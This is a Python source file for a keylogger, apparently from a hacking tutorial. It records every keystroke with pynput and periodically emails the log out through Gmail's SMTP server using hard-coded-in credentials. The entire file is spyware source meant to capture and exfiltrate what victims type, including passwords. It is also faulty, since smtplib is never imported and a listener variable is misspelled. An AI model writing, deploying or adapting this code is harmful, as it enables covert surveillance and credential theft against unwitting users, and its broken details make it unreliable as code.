#!/usr/bin/env python

import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
     
    def append_to_log(self, string):
        self.log = self.log + string
        
    def process_key_press(self, key):     # the function to execute each time a key is typed
        try:
            current_key = str(key.char)     # remove the "u" each time
        except AttributeError:
            if key == key.space:
                current_key = " "    
            else:
                current_key =" " + str(key) + " "
        self.append_to_log(current_key)
    
    def report(self):
        self.send_mail(self.email, self.password, self.log)      # print or save or send mail here
        self.log = ""
        timer = threading.Timer(self.interval, self.report)    # split program and run report every 5 seconds
        timer.start()
       
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    # create object
        with keyboard_listener:     # start streaming
            self.report()
            keyboard_listner.join()     # log key typed
